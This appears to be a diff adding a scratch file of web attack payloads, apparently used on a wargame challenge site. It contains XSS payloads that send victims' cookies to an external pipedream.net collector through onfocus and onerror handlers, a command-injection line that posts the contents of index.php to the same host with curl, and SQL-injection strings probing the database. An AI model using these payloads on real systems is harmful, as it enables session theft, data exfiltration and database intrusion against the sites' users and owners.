@@ -1,0 +1,36 @@
+<input name="name" value="asd;" onfocus="location.href='https://enowt0zdqkbivy3.m.pipedream.net?cookie='.concat(document.cookie);" autofocus="">
+
+asd;" autofocus onfocus="location.href='https://enowt0zdqkbivy3.m.pipedream.net?cookie='.concat(document.cookie);"
+
+1;location.href=\"https://enowt0zdqkbivy3.m.pipedream.net?cookie=\".concat(document.cookie);//;
+
+
+1;location.href=%22https://enowt0zdqkbivy3.m.pipedream.net?cookie=%22.concat(document.cookie);
+
+https://p.rubiya.kr/xss6/chall.php?text=[size=20]Do%20you%20know%20[color=blue]asd[/color]?[/size][img]x%22%20onerror="location.href='https://enowt0zdqkbivy3.m.pipedream.net?cookie='.concat(document.cookie);"[/img][url]http://example.com[/url][script]alert(%271%27);[/script]
+
+
+ping naver.com; curl  https://enowt0zdqkbivy3.m.pipedream.net -d "`cat index.php`"
+
+select 'qwert')' # ')'
+
+'password')'
+
+(select 'qwert') -- >>>> 'qwert') --')'
+
+'password')'
+
+!~?@#$%^&*()_+{} 
+
+test123',(select '123'));#
+
+test123
+
+test1234',(select 1234));#
+
+
+e'),('kkm2',(select length(database())));#
+
+
+
+
